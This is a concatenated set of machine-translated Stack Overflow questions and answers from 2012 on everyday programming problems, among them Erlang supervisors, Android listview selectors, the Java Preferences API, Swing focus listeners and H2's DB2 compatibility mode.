```

# erlang - 主管启动多个孩子作为原子操作

> ID：10246490
> 
> 赞同：2
> 
> 时间：2012-04-20T12:43:50.603
> 
> 标签：erlang, atomic, erlang-supervisor

我需要以原子方式启动多个主管子级。也就是说，如果组中的一个孩子在启动时失败，那么他们都不应该启动。

我将此操作视为一个函数：

```
start_children(SupRef, ChildSpecs)
ChildSpecs = List :: [child_spec()] 
```

我应该如何以适当的方式实现这一点？任何示例，库等？我的直觉告诉我，从列表中启动所有孩子，检查他们是否都成功，然后杀死剩下的孩子不是办法。

或者也许我的设计有缺陷，我真的不需要做这些事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:04:55.213

OTP 的[主管](http://www.erlang.org/doc/man/supervisor.html)`one_for_all`通过该策略为此提供支持。默认情况下，如果某个进程失败，所有进程都会重新启动，但您可以使用适合您目的的`Restart`参数（例如`temporary`）来更改此设置。

# c# - 管理员身份验证为用户

> ID：10246494
> 
> 赞同：1
> 
> 时间：2012-04-20T12:44:01.573
> 
> 标签：c#, asp.net-mvc, authentication, razor, ef-database-first

我正在使用 MVC 框架构建一个 Visual Studio C# Web 应用程序。

我已经使用网站管理工具设置了我的用户和角色等。

我希望销售人员能够代表客户购物/结帐。

因此，我希望能够允许销售人员在没有密码的情况下以用户身份进行身份验证（例如登录用户帐户）。

从这里开始，我希望能够轻松地重新登录到销售人员帐户。

这可能吗，如何启用此功能？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T13:18:28.597

我以前实现过类似的东西，但只在基于此[http://www.codeproject.com/Articles/43724/ASP-NET-Forms-authentication-user-impersonation的 Web 表单中实现](http://www.codeproject.com/Articles/43724/ASP-NET-Forms-authentication-user-impersonation)

不确定这是否适用于 MVC，但如果您查看评论，似乎有人至少进行了尝试，因此您可能能够使其正常工作。

# android - 奇怪的列表视图项目选择器外观（手指离开屏幕时未移除按下状态）

> ID：10246502
> 
> 赞同：3
> 
> 时间：2012-04-20T12:44:40.793
> 
> 标签：android, android-layout, android-widget, android-listview

我有如下列表视图项目

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="60dp"
    android:orientation="horizontal"
    android:descendantFocusability="blocksDescendants"
    >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        />

    <CheckBox
        android:id="@+id/checkBox1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:background="@drawable/music_list_item_checkbox_bg"
        />
</LinearLayout> 
```

`music_list_item_checkbox_bg.xml`是一个选择器，它将根据不同的状态显示不同的可绘制对象。

```
<selector xmlns:android="http://schemas.android.com/apk/res/android" >

    <item 
          android:state_pressed="false"
          android:state_selected="true"
          android:drawable="@drawable/btn_checkbox_check_untapped" />

    <item android:state_selected="true" 
          android:state_pressed="true"
          android:drawable="@drawable/btn_checkbox_check_tapped" />

    <item android:state_selected="false"  
          android:state_pressed="false"
          android:drawable="@drawable/btn_checkbox_uncheck_untapped" />

    <item android:state_selected="false"  
          android:state_pressed="true"
          android:drawable="@drawable/btn_checkbox_uncheck_tapped" />

</selector> 
```

当我按下列表视图中的项目并将触摸屏留在项目内时，取决于不同状态的可绘制对象是正确的。

***问题：***但是如果我按下项目并将手指水平移出项目（触摸点的X在项目的顶部和底部之间），然后离开屏幕，复选框的可绘制将保持在状态按下。（如果接触点的 X 不在项目的顶部和底部，则状态为正确）。

我尝试添加`android:duplicateParentState="true"`到复选框以获得与父级相同的状态，但它不起作用。

我很困惑，有人有什么想法吗？

**已编辑**

> 我之前尝试在项目中实现 onTouch 和 onIntercept，但如果我返回 super.onTouch(MotionEvent 事件)，则只能接收动作。只返回true，则接收到sequence event，但是listview的onItemClick不起作用。我尝试阅读 AbsListview 中的 onTouch 代码片段以了解如何解决问题，我发现有时通过调用 child.setPressed(false)，child(item) 的按下状态不会清除为 false，这取决于不同的触摸模式。

我真的很想要一个解决方案！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-28T04:23:19.540

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true" 
         android:drawable="@drawable/btn_checkbox_check_tapped" />
    <item android:state_selected="true" 
         android:drawable="@drawable/btn_checkbox_check_tapped" />
        <item android:drawable="@drawable/btn_checkbox_uncheck_untapped" />
</selector> 
```

尝试使用这些选择器作为背景

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T07:46:34.497

尝试使其内部的视图无法聚焦...

```
<TextView
    android:id="@+id/textView1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    />

<CheckBox
    android:id="@+id/checkBox1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="@drawable/music_list_item_checkbox_bg"
android:focussableInTouchMode="false"
android:focussable="false"
    /> 
```

您不能在触摸模式下使列表项成为焦点...这里因为您的复选框是可聚焦的，所以会产生问题...

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-02T03:38:38.417

我解决了这个问题，但可能不是一个好的解决方案或官方解决方案。

我使用我自己的`MyListView`类 extends from`ListView`而不是 SDK并在其中`ListView`接收`ACTION_UP`and ，然后手动将项目的按下状态设置为 false 。更多细节请看下面的代码。`ACTION_CANCEL``onTouchEvent`

```
@Override
public boolean onTouchEvent(MotionEvent event)
{
    boolean handled = super.onTouchEvent(event);
    Log.d("test", "event " + event.toString());
    int action = event.getAction();

    switch (action)
    {
    case MotionEvent.ACTION_DOWN:
        m_downPosition = pointToPosition((int)event.getX(), (int)event.getY());
        Log.d("test", "The down position " + m_downPosition);
        break;

    case MotionEvent.ACTION_UP:
    case MotionEvent.ACTION_CANCEL:
        int position = m_downPosition - getFirstVisiblePosition();
        View child = INVALID_POSITION != m_downPosition ? getChildAt(position) : null;
        if (null != child)
        {
            child.setPressed(false);
        }
        break;

    default:
        break;
    }
    return handled;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T13:31:59.293

您应该尝试使用这样的默认选择器项

```
<item android:drawable="@drawable/btn_checkbox_uncheck_untapped" /> 
```

这将处理所有剩余的状态，或者您应该有一个选择器项来处理`focussed`您的 xml 中缺少的状态。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-27T04:42:08.943

扩展`LinearLayout`您的项目并覆盖其中`onTouch`的。处理 ACTION_CANCEL 事件（返回 true）并更新项目的按下和选择状态。

```
class ItemLayout extends LinearLayout {

    @override
    boolean onTouch(MotionEvent ev) {
        switch(ev.getAction()) {
            case ACTION_CANCEL: 
                // Update/reset pressed and selected states of item or checbkox
                return true;
        }
        return super.onTouch(ev);
    }

} 
```

请参阅[http://groups.google.com/group/android-developers/browse_thread/thread/df75c5b8e4605167#](http://groups.google.com/group/android-developers/browse_thread/thread/df75c5b8e4605167#)

希望有帮助。

```
<ItemLayout 
  ....>
    <TextView
       ...
       />

    <CheckBox
       ...
       />
</ItemLayout > 
```

# java - Java 如何使用偏好 API？这些变量存储在哪里？

> ID：10246503
> 
> 赞同：13
> 
> 时间：2012-04-20T12:44:41.553
> 
> 标签：java, preferences

**说我有以下**

```
Preferences prefs = Preferences.userRoot().node(this.getClass().getName());

String ID1 = "Test1";

System.out.println(prefs.getBoolean(ID1, true));

prefs.putBoolean(ID1, false);

//prefs.remove(ID1); 
```

1.  下次我执行我的程序时，这个变量是否持续存在？
2.  这些变量存储在哪里？
3.  使用它的正确方法是什么？
4.  该方法比使用属性文件更好吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-20T13:37:46.587

1.  是的，该值是持久的，但仅适用于用户。它不会为其他用户提供。
2.  这是特定于操作系统的。对于 Windows，它使用注册表，对于 Linux，我相信它使用用户根目录中的隐藏文件，尽管我不是 100% 确定。
3.  你的问题中有一个很好的例子。
4.  它是*不同*的，不是*更好*的。首选项是一种透明地存储应用程序设置的方式。这些设置可以由用户在运行时更新（例如，您可以使用首选项来存储用户特定的设置）。首选项并不意味着可以在应用程序之外进行编辑。属性文件倾向于存储特定于应用程序的硬设置。这些设置对于每个用户都是相同的，并且往往不会经常更改。属性文件是文本文件，往往伴随应用程序的部署。您可以使用文本编辑器轻松编辑它们。应用程序更新属性文件是相当罕见的。

# sharepoint - sharepoint 2010 中文档库的面包屑

> ID：10246504
> 
> 赞同：0
> 
> 时间：2012-04-20T12:44:47.053
> 
> 标签：sharepoint, breadcrumbs

在 sharepoint 2010 中，我创建了一个文档库，并将其作为 Web 部件添加到新页面。我想在该 webpart 上方创建面包屑以处理 webpart 中文件夹的层次结构，并将显示“文件夹名 > 子文件夹 > mydocumentfolder”类型的层次结构，其中文件夹名 n 子文件夹名是可点击的。

问候， 拉吉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:26:19.840

当您进入文档库中的子文件夹时，您应该注意到浏览器 url 中出现了一个新的查询字符串。

例如：

> [http://mysite.test.com/sites/Accounting/Documents.aspx?RootFolder=%2Fsites%2FAAccounting%2FAAccounting%20Documents%2FExpense%20Reports](http://mysite.test.com/sites/Accounting/Documents.aspx?RootFolder=%2Fsites%2FAccounting%2FAccounting%20Documents%2FExpense%20Reports)

在这种情况下，我们可以将“根文件夹”查询字符串分解为：

*   “http://mysite.test.com” - Web 应用程序路径
*   “网站/会计” - 网站集路径
*   “会计文件” - 我的文件库的名称
*   “费用报告” - 我的子文件夹的名称

使用它，我们可以在页面上创建自定义面包屑 Web 部件，从查询字符串中读取根文件夹，然后剥离 Web 应用程序和网站集路径，并使用剩余信息获取文档库和子文件夹名称。

例如：

展示

*   会计凭证 > 费用报告

实际链接

*   [http://mysite.test.com/sites/Accounting/Documents.aspx](http://mysite.test.com/sites/Accounting/Documents.aspx) > [http://mysite.test.com/sites/Accounting/Documents.aspx?RootFolder=%2Fsites%2FAAccounting%2FAccounting%20Documents%2FExpense%20Reports](http://mysite.test.com/sites/Accounting/Documents.aspx?RootFolder=%2Fsites%2FAccounting%2FAccounting%20Documents%2FExpense%20Reports)

# c# - 接口的全名和显式实现它的属性之间的区别

> ID：10246507
> 
> 赞同：3
> 
> 时间：2012-04-20T12:45:15.443
> 
> 标签：c#

显式实现的接口的属性通常以它的接口全名开头。但是，如果它是一个嵌套接口，属性的名称会有点不匹配。

```
namespace NS
{
    public class Container
    {
        //FullName is NS.Container+ITest
        public interface ITest
        {
            int Prop { get; }
        }
    }

    public class Sample : Container.ITest
    {
        //Property's name is NS.Container.ITest.Prop
        int Container.ITest.Prop { get; }
    }
} 
```

为什么财产的名字不是`NS.Container+ITest.Prop`？或者接口最好命名为`NS.Container.ITest`. 这会更正确，不是吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T13:11:01.653

CLR 生成的类型名称与 C# 语言的命名约定完全不匹配。典型示例是`List<int>`，CLR 类型名称将类似于`List'1`（反引号）。这在 C# 中不是有效的类型标识符，就像 NS.Container+ITest 也是无效的一样。

您需要在 C# 代码中使用 C# 命名约定。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:20:28.950

如果您假设这`NS.Container+ITest`表明 ITest 是 NS.Container 下的嵌套类，那么`NS.Container+ITest.Prop`它将是接口的成员。但是 Prop 的*实现*是与 name 匹配的 Sample 的成员（显式实现接口）`NS.Container.ITest.Prop`。尝试访问接口的成员是不可能的，因此解析与实现匹配的名称似乎是合理的。

# python - python中包含列表的访问信息

> ID：10246510
> 
> 赞同：2
> 
> 时间：2012-04-20T12:45:18.267
> 
> 标签：python

我正在编写一个脚本，可以帮助我记录我们的网络室。

该脚本背后的想法是房间是一个列表，其中包含多个机架列表。机架列表包含称为模块的列表，带有服务器/交换机/等。在模块列表中是带有电缆编号的实际端口。

例如：

```
[04/02, [MM02, [1, #1992, 2, #1993, 3, #1567 ....], MM03, [1, #1234 .....]], 04/03, [MM01, .........]]] 
```

`04/02`= 第一个机架

`MM02`= 该机架中的第一个模块

`1`= 端口号

`#1992`= 电缆编号

我希望你能明白。

我编写的脚本比较了房间列表中的电缆编号，并查看是否有重复。现在它变得棘手：然后它应该用另一个端口的机架和模块替换电缆编号。这应该很容易，因为模块和机架是包含端口的列表中的第一个元素，但我不知道如何访问这些信息。（我是编程菜鸟）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:58:11.117

正如推荐中提到的，这里使用的更好的数据结构是嵌套[`dict`的 s](http://docs.python.org/library/stdtypes.html#mapping-types-dict)：

```
data = {
    "04/02": {
        "MM02": {1: "#1992", 2: "#1993", 3: "#1567", ...},
        "MM03": {1: "#1234", ...},
        ... 
    },
    "04/03": {
        "MM01": ...
        ...
    },
    ...
} 
```

然后您只需`data["04/02"]["MM02"] = {1: "#1992", 2: "#1993", 3: "#1567", ...}`替换值，但是，这意味着您需要手动创建子字典的缺点 - 但是，有[解决此问题的方法，](https://stackoverflow.com/questions/10218486/set-nested-dict-value-and-create-intermediate-keys/10218652#comment13126770_10218652)例如：

```
from functools import partial
from collections import defaultdict

tripledict = partial(defaultdict, partial(defaultdict, dict))
mydict = tripledict()
mydict['foo']['bar']['foobar'] = 25 
```

这些不仅在可读性和可用性方面具有优势，而且在访问速度方面也具有优势。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T14:14:13.640

这是您正在寻找的 Python 类。这很简单，所以如果你是你所说的菜鸟并且你想学习：阅读并理解代码。
底部给出了一些示例行以显示功能。对于多个机架，只需创建一个 Rack() 列表。祝你好运。

```
class Rack():
    def __init__(self, name):
        self.name = name
        self.modules = dict() 

    # port_cable_list should be in the form:
    # [(1, #1992), (2, #1993), (3, #1567)] 
    def add_module(self, name, port_cable_list):
        self.modules[name] = dict()
        for port, cable in port_cable_list:
            self.modules[name][port] = cable

    def remove_module(self, name):
        if name in self.modules:
            del self.modules[name]

    def add_port(self, module_name, port, cable):
        if module_name not in self.modules:
            self.modules[module_name][port] = cable
            return True
        return False

    def remove_port(self, module_name, port):
        if module_name in self.modules:
            if port in self.modules[module_name]:
                del self.modules[module_name][port]
                return True
            else:
                return False
        return False

    def module_exists(self, module_name):
        return module_name in self.modules

    def port_exists_in_module(self, module_name, port):
        if self.modules[module_name]:
            return port in self.modules[module_name]
        return False

    def print_module(self, module_name):
        if self.module_exists(module_name):
            print "%s\nPort\tCable" % (module_name)
            for port, cable in self.modules[module_name].items():
                print port, "\t", cable
            print
            return True
        return False

    def print_rack(self):
        print self.name + ':'
        for module_name in self.modules.keys():
            self.print_module(module_name)

SomeRack = Rack('04/02')
SomeRack.add_module("MM02", [(1, '#1992'), (2, '#1993'), (3, '#1567')])
SomeRack.add_module("MM03", [(1, '#1234')])
SomeRack.print_module("MM03")
SomeRack.print_rack()
SomeRack.remove_module("MM03")
print SomeRack.module_exists("MM03")
SomeRack.print_rack() 
```

# java - Java Swing FocusListener的MVC实现

> ID：10246511
> 
> 赞同：2
> 
> 时间：2012-04-20T12:45:19.060
> 
> 标签：java, swing, model-view-controller, focus, listener

我正在尝试使用 MVC 架构模式构建一个简单的 Java Swing 应用程序。我所做的是在我的视图中创建用户界面组件（作为私有），并具有返回组件的公共方法。然后这些方法被控制器调用，通过它我可以为事件/动作监听器编写方法。下面是一个示例：

看法：

```
private JButton btnAdd;

    public JButton getBtnAdd(){
        return btnAdd;
    } 
```

控制：

```
myGuiFrame gui = new myGuiFrame();

        //on add button clicked
    gui.getBtnAdd().addActionListener(new ActionListener() {
        @Override
        public void actionPerformed(ActionEvent e) {
            //calls to model
        }
    }); 
```

这个实现正确吗？

如果是这样，那么我对 FocusListeners 有问题。当我在视图中创建 FocusListener 时，会在视图中创建 focusLost 和 focusGained 方法。

```
private FocusListener l;

someComponent.addFocusListener(l);

        l = new FocusListener() {

            @Override
            public void focusLost(FocusEvent e) {
                // TODO Auto-generated method stub
            }

            @Override
            public void focusGained(FocusEvent e) {
                // TODO Auto-generated method stub

            }
        }; 
```

我希望所有事件处理程序都在我的控制器中。我的问题是......有没有一种方法可以从我的控制器调用/声明 focusLost 和 focusGained 方法？我试图将 FocusListener 定义为 public，以便我可以在我的控制器中定义它：

看法：

```
public FocusListener l;
public someComponentType someComponent; 
```

控制器：

```
gui.l = new FocusListener() {
    @Override
    public void focusLost(FocusEvent e) {
        // TODO Auto-generated method stub

}

@Override
public void focusGained(FocusEvent e) {
    // TODO Auto-generated method stub
    gui.someComponent.addFocusListener(gui.l);

    } 
```

};

然而，这不起作用。

是否可以从控制器处理 FocusEvents？

编辑：

天哪，我的坏。不太明白罗宾的意思。我太专注于在某处明确定义 FocusListener。一个简单的：

```
 gui.getTextFieldEmployeeCode().addFocusListener(new FocusListener() {

        @Override
        public void focusLost(FocusEvent e) {
            // TODO Auto-generated method stub

        }

        @Override
        public void focusGained(FocusEvent e) {
            // TODO Auto-generated method stub
            System.out.println("YES!!!");
        }
    }); 
```

在控制器中可以按照我计划的方式正常工作，尽管我非常喜欢 nIcE cOw 的处理方式。只是出于好奇，是否有在 Swing 应用程序上实现 MVC 的标准或广泛接受的方式？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T13:11:39.500

据我了解，您的做法是这样的。更好的是，我更喜欢匿名类，它们尊重封装的概念。在这里尝试一下这段代码，看看你能掌握什么：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class View
{
    private JButton focusButton;
    private JButton spareButton;

    private void createAndDisplayGUI()
    {
        JFrame frame = new JFrame("VIEW");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        JPanel contentPane = new JPanel();
        contentPane.setLayout(new FlowLayout(FlowLayout.LEFT, 5, 5));

        focusButton = new JButton("GAINED/LOST");
        focusButton.addFocusListener(new ButtonController(this));

        spareButton = new JButton("SPARE");
        spareButton.setOpaque(true);
        spareButton.addActionListener(new ButtonController(this));
        spareButton.addFocusListener(new ButtonController(this));

        contentPane.add(focusButton);
        contentPane.add(spareButton);

        frame.setContentPane(contentPane);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    public JButton getFocusButton()
    {
        return focusButton;
    }

    public JButton getSpareButton() 
    {
        return spareButton;
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new View().createAndDisplayGUI();
            }
        });
    }
}

class ButtonController implements FocusListener, ActionListener
{
    private View view;
    private JButton focusButton;
    private JButton spareButton;

    public ButtonController(View v)
    {
        view = v;
        focusButton = view.getFocusButton();
        spareButton = view.getSpareButton();
    }

    public void actionPerformed(ActionEvent ae)
    {
        JButton button = (JButton) ae.getSource();

        if (button == spareButton)
        {
            spareButton.setBackground(Color.BLUE);
            focusButton.setEnabled(true);
        }
    }

    public void focusGained(FocusEvent fe)
    {
        JButton button = (JButton) fe.getSource();

        if (button == focusButton)
        {
            focusButton.setEnabled(true);
        }
        else if (button == spareButton)
        {
            spareButton.setBackground(Color.WHITE);
        }
    }

    public void focusLost(FocusEvent fe)
    {
        JButton button = (JButton) fe.getSource();

        if (button == focusButton)
        {
            focusButton.setEnabled(false);
        }
        else if (button == spareButton)
        {
            spareButton.setBackground(Color.DARK_GRAY.darker());
        }
    }
} 
```

另一种方法是，如果您对`getters/setters`发送引用感到恼火，请按如下方式定义一个内部类（上一个示例的简单解决方法）：

```
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class View
{
    private JButton focusButton;
    private JButton spareButton;

    private void createAndDisplayGUI()
    {
        JFrame frame = new JFrame("VIEW");
        frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        JPanel contentPane = new JPanel();
        contentPane.setLayout(new FlowLayout(FlowLayout.LEFT, 5, 5));

        focusButton = new JButton("GAINED/LOST");
        focusButton.addFocusListener(new ButtonController());

        spareButton = new JButton("SPARE");
        spareButton.setOpaque(true);
        spareButton.addActionListener(new ButtonController());
        spareButton.addFocusListener(new ButtonController());

        contentPane.add(focusButton);
        contentPane.add(spareButton);

        frame.setContentPane(contentPane);
        frame.pack();
        frame.setLocationByPlatform(true);
        frame.setVisible(true);
    }

    private class ButtonController implements FocusListener, ActionListener
    {

        public void actionPerformed(ActionEvent ae)
        {
            JButton button = (JButton) ae.getSource();

            if (button == spareButton)
            {
                spareButton.setBackground(Color.BLUE);
                focusButton.setEnabled(true);
            }
        }

        public void focusGained(FocusEvent fe)
        {
            JButton button = (JButton) fe.getSource();

            if (button == focusButton)
                focusButton.setEnabled(true);
            else if (button == spareButton)
                spareButton.setBackground(Color.WHITE);
        }

        public void focusLost(FocusEvent fe)
        {
            JButton button = (JButton) fe.getSource();

            if (button == focusButton)
                focusButton.setEnabled(false);
            else if (button == spareButton)
                spareButton.setBackground(Color.DARK_GRAY.darker());
        }
    }

    public static void main(String... args)
    {
        SwingUtilities.invokeLater(new Runnable()
        {
            public void run()
            {
                new View().createAndDisplayGUI();
            }
        });
    }
} 
```

# objective-c - UIButton 图像调整大小/缩放以适应

> ID：10246515
> 
> 赞同：2
> 
> 时间：2012-04-20T12:45:27.830
> 
> 标签：objective-c, ios, xcode, ios5, xcode4

我有一个非常棘手的问题，我不知道如何解决它。我正在为 UIButtons 框架设置动画，当我为它设置动画时，我希望按钮中的图像缩放到与按钮相同的大小。它无需在我的 iPhone 模拟器上执行任何操作即可工作。但是当我在 iPad 模拟器上运行它时，它不会改变图像大小。我在几个地方添加了 [[gissaImg1 imageView] setContentMode:UIViewContentModeScaleToFill] 代码，但没有帮助。

有谁知道出了什么问题以及如何解决这个问题？

```
//Code to set the image
UIImage *image = [UIImage imageNamed:[NSString stringWithFormat:@"%@_small", 
                                              [[itemsForRound objectAtIndex:[[guessItems objectAtIndex:0] intValue]] valueForKey:@"Name"]]];

[self.gissaImg1 setImage:image forState:UIControlStateNormal];
[self.gissaImg1 setImage:image forState:UIControlStateHighlighted];

//Code to animate button
CGRect animateToSpot = (isIphone) ? CGRectMake(0, 0, 480, 320) : CGRectMake(0, 0, 1024, 768);
    [self performSelector:@selector(PlayCorrectSound:) withObject:nil afterDelay:1];
    [[gissaImg1 imageView] setContentMode:UIViewContentModeScaleToFill];
    [UIView animateWithDuration:1.5 delay:0 options:(UIViewAnimationOptionAllowUserInteraction | UIViewAnimationCurveLinear) animations:^{
        switch (index) {
            case 0:
                [[gissaImg1 imageView] setContentMode:UIViewContentModeScaleToFill];
                [self.gissaImg1 setFrame:animateToSpot];
                [self.view bringSubviewToFront:gissaImg1];
                break;
....... 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-04-20T12:51:02.073

尝试`setBackgroundImage`代替`setImage`，并且不对图像执行任何操作。（调整大小或 setContentMode）希望这会有所帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-25T07:48:23.890

```
UIImage *thubNailImage=[UIImage imageNamed:@"thumImage"];
[button.imageView setContentMode:UIViewContentModeScaleAspectFill];
CGSize imageSize=thubNailImage.size;
[button setImage:thubNailImage forState:UIControlStateNormal];
button.titleEdgeInsets = UIEdgeInsetsMake(0, -imageSize.width, 0, 0); 
```

如果您不想显示标题，请删除最后一行 ( `button.titleEdgeInsets = UIEdgeInsetsMake(0, -imageSize.width, 0, 0);`)

我认为这是对某人的帮助。:)

# java - 运行 H2（在 DB2 模式下）时的 DB2 语法（限制和脏读）

> ID：10246517
> 
> 赞同：4
> 
> 时间：2012-04-20T12:45:44.087
> 
> 标签：java, spring, limit, h2, dirtyread

我有一些我目前正在尝试进行单元测试的方法。这些方法在使用 Spring JdbcTemplates 的 DB2 v8 上运行良好（在生产中）。

每个 SQL 通过将“WITH UR”附加到语句来允许“脏读”。此外，他们中的一些人通过添加例如“FETCH FIRST 1 ROWS ONLY”来使用“限制”。

这适用于真正的 DB2，但我想针对内存数据库对这些方法进行单元测试——这是 H2 进入的地方。

如果我删除“WITH UR”和“FETCH FIRST ..”，一切正常，但我不想更改方法，而只是更改后端数据库。

据我所知，这不能直接使用 H2，因为语法不同（尽管我使用 MODE=DB2）。

现在，该怎么办？我应该/可以使用另一个内存数据库吗？我不想更改方法，也不想添加“测试”功能/黑客，所以这是不行的。

想法和同样非常感谢！

编辑

我不确定是我还是什么，但我收到以下错误。注意，我使用的是 Spring 3.1 和 H2 1.3.166，数据库的 url 是“jdbc:h2:~/testdb;MODE=DB2”。我不知道它为什么会失败，因为 sql 在 H2 控制台中运行时有效，但不是来自我的单元测试（猜它不是损坏的 H2）：

```
Tests run: 3, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 0.109 sec <<< FAILURE!
getAdvisor(impl.AdvisorServiceDaoImplTest)  Time elapsed: 0.078 sec  <<< ERROR!
org.springframework.jdbc.BadSqlGrammarException: PreparedStatementCallback; bad SQL grammar [SELECT * FROM ADVISOR FETCH FIRST 1 ROWS ONLY ]; nested exception is org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM ADVISOR FETCH[*] FIRST 1 ROWS ONLY "; SQL statement:
SELECT * FROM ADVISOR FETCH FIRST 1 ROWS ONLY  [42000-166]
    at org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:233)
    at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:72)
    at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:603)
    at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:637)
    at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:662)
    at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:702)
    at org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate.queryForObject(NamedParameterJdbcTemplate.java:178)
    at org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate.queryForObject(NamedParameterJdbcTemplate.java:185)
    at impl.AdvisorServiceDaoImpl.getAdvisor(AdvisorServiceDaoImpl.java:150)
    at impl.AdvisorServiceDaoImplTest.getAdvisor(AdvisorServiceDaoImplTest.java:69)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:45)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:42)
    at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
    at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:74)
    at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:83)
    at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:72)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:231)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:47)
    at org.junit.runners.ParentRunner$3.run(ParentRunner.java:231)
    at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:60)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:229)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:50)
    at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:222)
    at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61)
    at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:71)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:300)
    at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:174)
    at org.apache.maven.surefire.junit4.JUnit4TestSet.execute(JUnit4TestSet.java:62)
    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:140)
    at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:127)
    at org.apache.maven.surefire.Surefire.run(Surefire.java:177)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:338)
    at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:997)
Caused by: org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "SELECT * FROM ADVISOR FETCH[*] FIRST 1 ROWS ONLY "; SQL statement:
SELECT * FROM ADVISOR FETCH FIRST 1 ROWS ONLY  [42000-166]
    at org.h2.message.DbException.getJdbcSQLException(DbException.java:329)
    at org.h2.message.DbException.get(DbException.java:169)
    at org.h2.message.DbException.get(DbException.java:146)
    at org.h2.message.DbException.getSyntaxError(DbException.java:181)
    at org.h2.command.Parser.getSyntaxError(Parser.java:484)
    at org.h2.command.Parser.prepareCommand(Parser.java:233)
    at org.h2.engine.Session.prepareLocal(Session.java:415)
    at org.h2.engine.Session.prepareCommand(Session.java:364)
    at org.h2.jdbc.JdbcConnection.prepareCommand(JdbcConnection.java:1111)
    at org.h2.jdbc.JdbcPreparedStatement.<init>(JdbcPreparedStatement.java:71)
